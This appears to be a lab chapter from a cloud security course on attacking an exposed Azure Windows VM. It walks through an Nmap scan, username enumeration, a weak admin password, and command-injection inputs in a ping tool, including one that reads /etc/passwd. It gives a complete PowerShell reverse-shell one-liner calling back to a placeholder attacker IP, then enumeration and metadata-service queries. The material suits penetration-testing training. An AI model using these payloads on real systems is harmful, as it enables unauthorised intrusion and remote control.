# Azure Virtual Machines

## Introduction

Azure Virtual Machines are the same as Amazon's EC2 instances.

Basically, Azure Virtual Machines

- are like virtual machines on the cloud
- you start a Azure VM and you are given the choice of adding key pair for ssh or providing a password for a username
- for Windows images, a password for the Administrator account is made available.
- you can choose to use a pre-created image for linux and Windows
- you can add the virtual machines in their own private networks using Virtual Network
- you can allow access to certain ports and certain IPs using network groups

Attackers can target any of the aspects of Virtual Machine. This not only includes web applications, services etc. running on the instance but also the access to the Virtual Machine itself.

## What are we going to cover?

This chapter covers some of the attacks that can occur on an exposed Azure virtual machine on the Internet. This chapter also covers attacks and commands that can be run once a Windows Virtual Machine is compromised.

## Steps to attack

- SSH into attacker EC2
- All attacks in this module will be run from the attacker EC2

### Attack 1 - Service discovery on the target using Nmap

Nmap is one of the world's most widely used port scanning utilities. We can use it to discover the services exposed by the target virtual machine.

Run the following commands from the cloud attacker machine to complete this exercise

    sudo nmap -sS --script http-enum -v --top-ports 10000 -sV -g80 <TARGET-IP-ADDRESS>

Analyze the output. If you see any ports open, it is because you have set the Azure network security group rules to see the ports.

## Attack 2 - Attack the web application to gain shell access

Although, you can set the Azure Network Security group to allow your student IP (like the RDP port) and access the IP from the student/host machine directly, it is recommended that you let only the attacker machine be accessible and use a SOCKS proxy to connect and attack the target.

1. Read the `/robots.txt` to find a hidden (interesting) directory
2. Attempt various usernames. Notice that the application can be used to perform username enumeration
3. Identify the password for the `admin` user and login (Hint: One of the top 10 most common passwords)
4. Identify the vulnerability post login

It appears that the application accepts an IP address or a hostname and performs a ping request. From the output it appears that the server uses the `ping` command in the backend. To be able to test and exploit the vulnerability, we will need to identify the Operating System in the backend first.

By passing the following two inputs we can identify if the OS is Linux or Windows:

- For Linux
1. `127.0.0.1;cat /etc/passwd`

- For Windows
1. `127.0.0.1&ipconfig`

Once we have identified the OS, we can get a reverse shell to execute more commands and get a better idea of the environment we are in

To obtain a reverse shell do the following

1. Start netcat listener on port 9999 of the attacker EC2 using `nc -lvp 9999`
2. Ensure the port is open on the AWS Security Groups (Firewall) so that a reverse shell can connect back. Follow the instructions at - [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/authorizing-access-to-an-instance.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/authorizing-access-to-an-instance.html)
3. Run a windows powershell reverse shell command via the command injection. **Make sure to replace the value of `EXTERNAL-AWS-ATTACKER-IP` in the following with your cloud attacker machine IP**
 

```
127.0.0.1&powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('EXTERNAL-AWS-ATTACKER-IP',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Post Exploitation

### Additional information gathering

1. To obtain IP information: `Get-NetIPConfiguration`
2. To obtain list of users on the system: `Get-WmiObject -Class Win32_UserAccount`
3. Obtain system information: `Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | FL`
4. Obtain detailed information about the entire system: `systeminfo`

### Accessing the metadata service

1. Run the following command in the reverse shell to read the metadata

`curl -UseBasicParsing -Headers @{"Metadata"="true"} 'http://169.254.169.254/metadata/instance?api-version=2017-08-01&format=text'`

2. To get the public IP address of the Instance, run 

`curl -UseBasicParsing -Headers @{"Metadata"="true"} 'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-08-01&format=text'`

## Addtional References

- [Nmap man page](https://linux.die.net/man/1/nmap)
- [Azure Metadata Service](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)
- [wincmdfu Twitter Account](https://twitter.com/wincmdfu)